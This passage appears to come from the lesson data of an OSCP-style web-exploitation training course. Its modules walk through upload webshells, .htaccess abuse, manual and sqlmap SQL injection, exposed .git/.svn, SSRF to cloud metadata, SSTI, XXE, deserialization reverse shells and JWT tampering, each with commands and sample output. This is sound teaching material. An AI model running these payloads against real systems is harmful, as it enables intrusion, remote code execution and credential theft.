that is a valid GIF and valid PHP passes content inspection and executes.","demo":[{"run":"printf 'GIF89a;\\n<?php system($_GET[\"c\"]); ?>' > shell.php","out":"(a file that is a valid GIF and valid PHP)","sig":""},{"run":"curl -s -F \"file=@shell.php;type=image/gif\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php\"}","sig":"/uploads/shell.php"}],"note":"The GIF89a header satisfies a content check; the PHP after it still runs when requested."},{"t":"Abuse .htaccess or web.config","d":"If you can upload a .htaccess (Apache) or web.config (IIS), upload one that tells the server to execute your chosen extension as code, then upload the payload under that extension. This turns an images-only upload into RCE.","demo":[{"run":"echo 'AddType application/x-httpd-php .jpg' > .htaccess","out":"(a rule: run .jpg files as PHP)","sig":""},{"run":"curl -s -F \"file=@.htaccess\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/.htaccess\"}","sig":".htaccess"},{"run":"curl -s -F \"file=@shell.jpg\" http://<target>/upload.php && curl -s \"http://<target>/uploads/shell.jpg?c=id\"","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"First change the rules, then a plain .jpg runs as PHP. Works only where .htaccess is honoured."},{"t":"Find where it landed, then trigger it","d":"An accepted upload is useless if you cannot reach it. A returned id or a predictable /uploads/ path gives you the URL; request it to run your code. If that directory forbids execution, the file may still feed an LFI, XXE, or image-parser bug instead.","demo":[{"run":"curl -s -F \"file=@shell.php\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php\"}","sig":"/uploads/shell.php"},{"run":"curl -s \"http://<target>/uploads/shell.php?c=id\"","out":"uid=33(www-data) gid=33(www-data) groups=33(www-data)","sig":"uid=33(www-data)"}],"note":"The response told you the path; requesting it runs your code. No path, no shell."}]},
      why: "Reach for this the moment the app exposes anything that takes a file, a profile photo, a document import, an avatar, because it is the shortest route from merely touching the application to running code on the server. When several web bugs are on the table, prefer a promising upload over slower avenues like blind SQL injection: a working upload is often a shell in minutes, where blind extraction is hours of careful queries. It stays worth trying right up until you have a foothold, and it is a staple of exam machines precisely because it rewards patient, methodical filter-testing over luck.",
      cmd: 'curl -s -F "file=@shell.php" http://10.10.10.10/upload.php', tool: 'curl',
      output: [
        '{"status":"ok","stored":"/uploads/shell.php"}',
      ].join('\n'),
      signal: '{"status":"ok","stored":"/uploads/shell.php"}',
      teach: 'The upload accepted a .php file and told you where it landed. If /uploads/ executes PHP, requesting shell.php runs your code, upload-to-webshell. Many filters are weak (check extension tricks, content-type, magic bytes).',
    },
    'sqli-basics': {
      leadup: [{"key":"params","label":"Parameter discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[*] Scanning http://<target>/product.php\n[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A hidden GET parameter feeds a lookup, exactly the kind of value that lands unescaped in a SQL query."}]},{"key":"form","label":"A visible form","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Spot a form while browsing","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'form action|input name'","out":"<form action=\"/login.php\" method=\"post\">\n  <input name=\"username\"><input name=\"password\">","sig":"action=\"/login.php\"","teach":"A login box is a classic injection target: the username flows straight into a WHERE clause."}]}],
      how: {"lead":"Confirm the injection and its type by hand, then extract. The type decides the whole approach, so pin it down before you reach for a tool:","items":[{"t":"Confirm with a quote, then with logic","d":"A single quote (?id=1') that throws an error or changes the page is the first tell. Confirm it reaches the query with boolean logic: ?id=1 AND 1=1 behaves normally while ?id=1 AND 1=2 does not."},{"t":"Identify the injection type","d":"Error-based (the DB error shows on the page), UNION-based (you can append a SELECT and read columns), boolean-blind (the page flips true/false), or time-blind (SLEEP(5) delays the reply). Each needs a different extraction method."},{"t":"UNION: match the columns","d":"Find the column count with ORDER BY 1,2,3… until it errors, then UNION SELECT 1,2,3 to see which columns echo on the page. Put data in an echoing column: UNION SELECT 1,@@version,3, or group_concat(user,0x3a,password) from the users table."},{"t":"Blind: ask yes/no, or time it","d":"Boolean-blind: pull one character at a time with SUBSTRING and a true/false page diff. Time-blind: wrap the test in IF(…,SLEEP(5),0) and measure the delay. It is slow by hand, which is exactly why you confirm manually before letting sqlmap finish it in a lab."},{"t":"Escalate to files and shells","d":"With the FILE privilege, LOAD_FILE('/etc/passwd') reads files and INTO OUTFILE writes a webshell into the webroot. On MSSQL, sysadmin lets you enable xp_cmdshell for OS commands. This is how SQLi becomes a foothold instead of just data theft."}]},
      why: "Confirm SQL injection by hand before you touch a tool, because you cannot exploit (or, on the exam, explain) what you do not understand. A single quote that changes the response, an error, a different result, a timing shift, is the whole signal. Do this the instant a parameter looks like it reaches a database. Getting the injection type right here, error-based, boolean-blind, or time-blind, decides every step that follows, so slow down and read what the app tells you.",
      cmd: "curl -s 'http://10.10.10.10/page.php?id=1%27'", tool: 'curl',
      output: [
        'You have an error in your SQL syntax; check the manual that',
        "corresponds to your MySQL server version for the right syntax near '''",
      ].join('\n'),
      signal: 'You have an error in your SQL syntax; check the manual that',
      teach: 'A single quote that throws a SQL error means your input reaches the query unescaped, the first proof of SQL injection. From here you find the column count and start extracting data (or hand it to sqlmap).',
    },
    'manual-sqli-exploitation': {
      leadup: [{"key":"confirmed","label":"From a confirmed injection","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate; a single quote will tell you whether it reaches the database unescaped."},{"title":"Confirm the injection","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1'\"","out":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version","sig":"You have an error in your SQL syntax","teach":"The quote broke the query, so injection is confirmed; from here you extract the data (by hand on the exam)."}]},{"key":"blind","label":"Confirmed blind","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate injection point."},{"title":"Confirm with boolean logic","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1 AND 1=2\"","out":"<h2>No product found</h2>","sig":"No product found","teach":"id=1 AND 1=1 shows the product while id=1 AND 1=2 does not, so the page reacts to boolean logic: injection confirmed with no error message at all."}]}],
      why: "This is the single most examinable SQL skill, precisely because the exam bans the tool that would otherwise do it for you. Students who only ever run sqlmap freeze the moment it is taken away, so the whole point of this module is fluency under that constraint: taking a database apart by hand fast enough that it is not what costs you the box. Reach for it the instant you have a confirmed injection, and drill the blind path hardest, since it is the slowest to improvise and the easiest to fumble when the clock is running.",
      cmd: "curl -s 'http://10.10.10.10/page.php?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -'", tool: 'curl',
      output: [
        '<h2>Search results</h2>',
        '<div class="row">admin:21232f297a57a5a743894a0e4a801fc3</div>',
        '<div class="row">jdoe:5f4dcc3b5aa765d61d8327deb882cf99</div>',
      ].join('\n'),
      signal: '<div class="row">admin:21232f297a57a5a743894a0e4a801fc3</div>',
      teach: 'The UNION SELECT reflected the username and password columns straight into the page, one row per user, concatenated with a colon. You have extracted every credential in the users table by hand with a single request, no sqlmap involved. Crack the hashes offline, then reuse the recovered passwords to log in.',
    },
    'sqlmap-automation': {
      leadup: [{"key":"confirmed","label":"From a confirmed injection","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate; a single quote will tell you whether it reaches the database unescaped."},{"title":"Confirm the injection","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1'\"","out":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version","sig":"You have an error in your SQL syntax","teach":"The quote broke the query, so injection is confirmed; from here you extract the data (by hand on the exam)."}]},{"key":"blind","label":"Confirmed blind","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate injection point."},{"title":"Confirm with boolean logic","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1 AND 1=2\"","out":"<h2>No product found</h2>","sig":"No product found","teach":"id=1 AND 1=1 shows the product while id=1 AND 1=2 does not, so the page reacts to boolean logic: injection confirmed with no error message at all."}]}],
      why: "Once you have confirmed injection by hand, sqlmap automates the tedious part: dumping tables, reading files, sometimes landing a shell. The rule you must internalise is that sqlmap is banned on the OSCP exam, so treat this as a lab-only accelerator and make sure you can do the same extraction manually. Reach for it in labs to save time after you already understand the bug, never as a way to discover bugs you have not verified.",
      cmd: 'sqlmap -r request.txt --batch --level=3 --risk=2 --dump', tool: 'sqlmap',
      output: [
        "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
        '[INFO] the back-end DBMS is MySQL',
        'Database: appdb',
        'Table: users',
        '| id | username | password                         |',
        '| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |',
      ].join('\n'),
      signal: "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
      teach: 'Once you have confirmed injection by hand, sqlmap automates the extraction, it enumerates databases, tables, and dumps rows. Those password hashes go straight to your cracker. Use -r with a saved request so it tests the real parameters.',
    },
    'git-exposed': {
      leadup: [{"key":"ferox","label":"Content discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"301      GET  /.git => http://<target>/.git/\n200      GET  /.git/HEAD","sig":"200      GET  /.git/HEAD","teach":"An exposed .git directory means the whole source history is downloadable, including secrets that were committed and later \"deleted\"."}]},{"key":"nikto","label":"A scanner flag","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Run a quick scan","tool":"nikto","where":"local","cmd":"nikto -h http://<target>","out":"+ /.git/config: Git config file found, source may be exposed","sig":"/.git/config","teach":"Nikto flags common exposures like .git on its first pass; treat the hit as a lead to dump the whole repository."}]}],
      why: "A site deployed by git that left its /.git folder readable hands you the entire source history, and history is where secrets hide: a password in an old commit, a config file, an API key someone \"removed\" later but never scrubbed. Check /.git/HEAD on every web app, it is a one-request test with an outsized payoff. When it is there, reconstruct the repo and read the code, you are no longer testing blind.",
      cmd: 'git-dumper http://10.10.10.10/.git/ gitloot', tool: 'git-dumper',
      output: [
        '[+] Testing http://10.10.10.10/.git/HEAD [200]',
        '[+] Fetching .git/ ...',
        '[+] Running git checkout .',
        'Repository reconstructed in gitloot/',
        'config.php:  $db_pass = "SourceOnly2026!";',
      ].join('\n'),
      signal: 'config.php:  $db_pass = "SourceOnly2026!";',
      teach: 'An exposed .git/ directory lets git-dumper reconstruct the whole source tree, including secrets committed by mistake. A database password in config.php is a free credential and a read of exactly how the app works.',
    },
    'svn-exposed': {
      leadup: [{"key":"ferox","label":"Content discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"301      GET  /.svn => http://<target>/.svn/\n200      GET  /.svn/wc.db","sig":"200      GET  /.svn/wc.db","teach":"The .svn metadata (wc.db) lets you reconstruct the source tree and recover files the developers thought they removed."}]},{"key":"nikto","label":"A scanner flag","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Run a quick scan","tool":"nikto","where":"local","cmd":"nikto -h http://<target>","out":"+ /.svn/entries: Subversion metadata found, source may be exposed","sig":"/.svn/entries","teach":"Nikto surfaces .svn the same way it flags .git; the hit is your cue to reconstruct the source tree."}]}],
      why: "The Subversion version of an exposed .git: an old deployment left /.svn/ behind, and its entries and pristine copies rebuild the whole working tree, source and secrets included. It turns up on legacy apps, and there is sometimes an SVN service on 3690 that allows an anonymous checkout. Check it when the stack looks dated or when .git came up empty. Like the git case, it flips you from guessing to reading the real code.",
      cmd: 'curl -s http://10.10.10.10/.svn/entries', tool: 'curl',
      output: [
        '10',
        'dir',
        'https://svn.acme.internal/app',
        'config.php',
        'db_connect.php',
      ].join('\n'),
      signal: 'db_connect.php',
      teach: 'An exposed .svn/ directory leaks the source tree the way .git/ does. The entries file lists real filenames, db_connect.php likely holds database credentials. Reconstruct the files and read them.',
    },
    'ssrf': {
      leadup: [{"key":"urlparam","label":"A URL input","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a URL field","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'name=\"url\"|fetch|preview'","out":"<input name=\"url\" placeholder=\"https://example.com/image.png\">","sig":"name=\"url\"","teach":"An input that takes a URL is the SSRF surface: the server will fetch whatever you point it at."}]},{"key":"webhook","label":"An import/webhook setting","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a server-side fetcher","tool":"curl","where":"local","cmd":"curl -s http://<target>/settings/integrations","out":"{\"webhook_url\":\"\",\"import_from_url\":\"\",\"avatar_by_url\":\"\"}","sig":"webhook_url","teach":"A webhook or \"import from URL\" feature makes the server issue requests for you, which is SSRF by design."}]}],
      why: "SSRF is the bug that converts \"outside the network\" into \"inside it\", which is why it earns a probe on any input that even smells like a URL, however dull the feature looks. Its payoff scales with the environment: a flat lab box gives you an internal-only admin panel, while a cloud target can hand over credentials from the metadata service and, with them, the account. Reach for it early, because what it opens up (internal services, hosts you could not otherwise touch) usually dwarfs whatever you were originally poking at.",
      cmd: "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'", tool: 'curl',
      output: [
        '{',
        '  "AccessKeyId": "AKIAEXAMPLE123",',
        '  "SecretAccessKey": "wJalrXUtnFEMI/EXAMPLEKEY",',
        '  "Token": "IQoJb3JpZ2luX2VjE..."',
        '}',
      ].join('\n'),
      signal: '  "AccessKeyId": "AKIAEXAMPLE123",',
      teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at the cloud metadata endpoint (169.254.169.254) it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
    },
    'ssti': {
      leadup: [{"key":"reflect","label":"A reflected input","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Test for evaluation","tool":"curl","where":"local","cmd":"curl -s 'http://<target>/greet?name={{7*7}}'","out":"<h1>Hello 49</h1>","sig":"Hello 49","teach":"The page rendered 7*7 as 49, so your input is evaluated as a template expression, not printed as text."}]},{"key":"feature","label":"A template feature","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a template editor","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /admin/email-templates\n200      GET  /preview","sig":"200      GET  /admin/email-templates","teach":"A template or email-preview editor renders user-controlled templates on the server, the richest SSTI surface there is."}]}],
      why: "Template injection is RCE hiding behind a friendly feature, a name field, a search box, an email template, that passes your input through a server-side template engine. The famous {{7*7}} test is just the detector: if 49 comes back, the server is executing template code, and template code reaches a shell. Try it wherever your input is reflected into a page. Which engine you hit (Jinja2, Twig, Freemarker) decides the exact payload, so fingerprint it before you escalate.",
      cmd: "curl -s 'http://10.10.10.10/hello?user={{7*7}}'", tool: 'curl',
      output: [
        '<h1>Hello 49</h1>',
      ].join('\n'),
      signal: '<h1>Hello 49</h1>',
      teach: 'You sent {{7*7}} and the page returned 49, the template engine evaluated your input instead of printing it. Server-Side Template Injection often escalates straight to remote code execution; identify the engine, then build the RCE payload.',
    },
    'xxe': {
      leadup: [{"key":"xmlapi","label":"An XML API","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Flip the Content-Type","tool":"curl","where":"local","cmd":"curl -s -X POST http://<target>/api/import -H 'Content-Type: application/xml' -d '<x/>'","out":"{\"error\":\"Invalid XML: root element <x> has no <data> child\"}","sig":"Invalid XML","teach":"A parser error after switching to application/xml proves the endpoint parses XML, which is the XXE surface."}]},{"key":"docupload","label":"An Office-doc upload","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a document upload","tool":"curl","where":"local","cmd":"curl -s http://<target>/upload | grep -i accept","out":"<input type=\"file\" name=\"doc\" accept=\".docx,.xlsx,.pptx,.svg\">","sig":"accept=\".docx,.xlsx,.pptx,.svg\"","teach":"Office documents and SVGs are XML inside; an upload that parses them server-side can resolve external entities."}]}],
      why: "XXE is easy to walk past because XML hides inside things that do not look like XML: a SAML login, a .docx upload, an API that quietly accepts application/xml. That invisibility is exactly why you test for it on purpose instead of hoping to stumble over it. Treat a dependable file read as the baseline win and pivoting the parser into SSRF as the upgrade; only chase RCE on the rare parser that permits it, since the file read alone is usually enough to find your next step.",
      cmd: 'curl -s -X POST http://10.10.10.10/api -H "Content-Type: application/xml" --data-binary @xxe.xml', tool: 'curl',
      output: [
        '<result>',
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        '</result>',
      ].join('\n'),
      signal: 'root:x:0:0:root:/root:/bin/bash',
      teach: 'XML External Entity injection abuses a parser that resolves external entities. Your payload declares one pointing at file:///etc/passwd and the response echoes the file back. Any endpoint that accepts XML is worth testing.',
    },
    'deserialization': {
      leadup: [{"key":"phpcookie","label":"A serialized PHP cookie","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Decode the cookie","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/ | grep -i set-cookie","out":"Set-Cookie: data=Tzo0OiJVc2VyIjoxOntzOjQ6InJvbGUiO3M6NDoidXNlciI7fQ%3D%3D","sig":"Tzo0OiJVc2Vy","teach":"That value base64-decodes to O:4:\"User\":1:{...}, a serialized PHP object; if the app unserializes it you control object injection."}]},{"key":"javablob","label":"A Java serialized blob","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Spot the magic bytes","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/api/state | grep -iE 'viewstate|rO0'","out":"session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...","sig":"rO0AB","teach":"rO0AB is base64 for the Java serialized-stream header (AC ED 00 05); a ysoserial gadget chain against this is remote code execution."}]}],
      why: "When an app rebuilds objects from data it trusts, serialized blobs in cookies, ViewState, or API bodies, a crafted blob can run code during that rebuild. Recognise the markers (Java rO0AB, .NET __VIEWSTATE, PHP O:4:), because the exploit is language-specific and gadget-chain heavy, so this is a \"know it when you see it\" move more than a blind probe. Reach for it when you spot a serialized blob under your control; it is high-impact but rarely the first thing to try.",
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
      teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. Start a listener, then POST the gadget blob, the app runs it and dials back to you. Look for serialised data in cookies, parameters, and APIs.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
        { where: 'local', tool: 'curl', cmd: 'curl -s -X POST http://10.10.10.10/api --data-binary @cc5-payload.bin', output: [
          '↩ the app deserialised it and ran your gadget, caught on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
          'uid=0(root) gid=0(root) groups=0(root)',
        ].join('\n') },
      ],
    },
    'jwt-attacks': {
      leadup: [{"key":"cookie","label":"A JWT in the cookie","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Read the session cookie","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/login -d 'user=guest&pass=guest' | grep -i set-cookie","out":"Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.1n4...; HttpOnly","sig":"eyJhbGciOiJIUzI1NiJ9","teach":"The eyJ... prefix is a base64url JWT header, so authentication rides in a token you can decode and tamper with."}]},{"key":"api","label":"A Bearer token from an API","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Log in to the API","tool":"curl","where":"local","cmd":"curl -s http://<target>/api/login -H 'Content-Type: application/json' -d '{\"user\":\"guest\",\"pass\":\"guest\"}'","out":"{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.aZ...\"}","sig":"\"token\":\"eyJhbGci","teach":"An API that returns a JWT trusts that token on every later request; that trust in the signature is exactly what you attack."}]}],
      why: "Wherever authentication rides in a JWT, the two cheapest checks in web pentesting live here: an alg:none token and a guessable HMAC secret each take under a minute and either one mints any account you want. That asymmetry, seconds of effort against a full auth bypass, is why you run them on every token you meet before reaching for anything slower. The heavier wins, key confusion or a secret lifted from leaked source, are for later, once the free checks are spent.",
      cmd: "echo $TOKEN | cut -d. -f2 | base64 -d", tool: 'sh',
      output: [
        '{"user":"guest","role":"user","iat":1700000000}',
      ].join('\n'),
      signal: '{"user":"guest","role":"user","iat":1700000000}',
      teach: 'Decode the token first, the middle segment is the claims. If the server accepts alg:none, or the HMAC secret is weak enough to crack (hashcat -m 16500), you re-sign a token that says role:admin. The claims tell you exactly what to tamper with.',
    },
    'nosql-injection': {
